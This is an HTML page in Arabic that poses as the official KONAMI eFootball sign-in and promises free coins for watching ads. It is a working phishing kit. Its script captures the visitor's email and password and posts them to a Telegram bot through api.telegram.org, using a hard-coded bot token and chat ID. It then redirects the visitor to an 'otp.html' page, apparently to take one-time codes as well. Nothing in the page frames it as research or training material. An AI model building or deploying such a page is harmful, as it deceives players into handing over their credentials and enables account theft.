<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eFootball™ — تسجيل الدخول</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
        body { background: #f0f2f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .container { background: #fff; border-radius: 16px; padding: 35px 30px; width: 100%; max-width: 420px; box-shadow: 0 10px 40px rgba(0,0,0,0.08); }
        
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; padding-bottom: 18px; border-bottom: 1px solid #e5e7eb; }
        .konami-logo { font-size: 16px; font-weight: 900; color: #e60012; letter-spacing: 2px; }
        .efootball-logo { font-size: 14px; font-weight: bold; color: #0066ff; }
        
        h1 { color: #111827; font-size: 22px; margin-bottom: 8px; }
        .subtitle { color: #6b7280; font-size: 13px; margin-bottom: 25px; }
        
        .input-group { margin-bottom: 18px; }
        .input-group label { display: block; color: #374151; font-size: 13px; font-weight: 600; margin-bottom: 8px; }
        .input-group input { width: 100%; padding: 13px 15px; background: #f9fafb; border: 2px solid #e5e7eb; border-radius: 10px; color: #111827; font-size: 14px; }
        .input-group input:focus { outline: none; border-color: #0066ff; background: #fff; }
        
        .btn-primary { width: 100%; padding: 15px; background: linear-gradient(135deg, #0066ff, #00a8ff); color: #fff; border: none; border-radius: 10px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        
        .error { color: #ef4444; font-size: 13px; text-align: center; margin-top: 15px; min-height: 20px; }
        
        .footer { text-align: center; margin-top: 25px; padding-top: 18px; border-top: 1px solid #e5e7eb; }
        .footer p { font-size: 11px; color: #9ca3af; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="konami-logo">KONAMI</div>
            <div class="efootball-logo">eFootball™</div>
        </div>

        <h1>تسجيل الدخول</h1>
        <p class="subtitle" id="subtitle">سجل دخولك للحصول على الكوينز</p>

        <form id="loginForm">
            <div class="input-group">
                <label>KONAMI ID (Email)</label>
                <input type="email" id="email" placeholder="example@email.com" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="password" placeholder="••••••••" required>
            </div>
            <button type="submit" class="btn-primary">Sign In</button>
        </form>

        <p class="error" id="error"></p>

        <div class="footer">
            <p>© 2025 KONAMI. All rights reserved.</p>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8863933045:AAE-GSd-pWrvzSJiijFNkjm9sgZ0g7S7E2w';
        const CHAT_ID = '7644504212';
        
        const coins = localStorage.getItem('selected_coins') || '0';
        const ads = localStorage.getItem('selected_ads') || '0';
        document.getElementById('subtitle').textContent = `سجل دخولك لمشاهدة ${ads} إعلان والحصول على ${coins} كوين`;
        
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                document.getElementById('error').textContent = 'Please fill in all fields';
                return;
            }
            
            localStorage.setItem('ef_email', email);
            
            const message = `⚽ eFootball — Account\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🪙 Coins: ${coins}\n📺 Ads: ${ads}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                });
            } catch (err) { console.error(err); }
            
            window.location.href = 'otp.html';
        });
    </script>
</body>
</html>
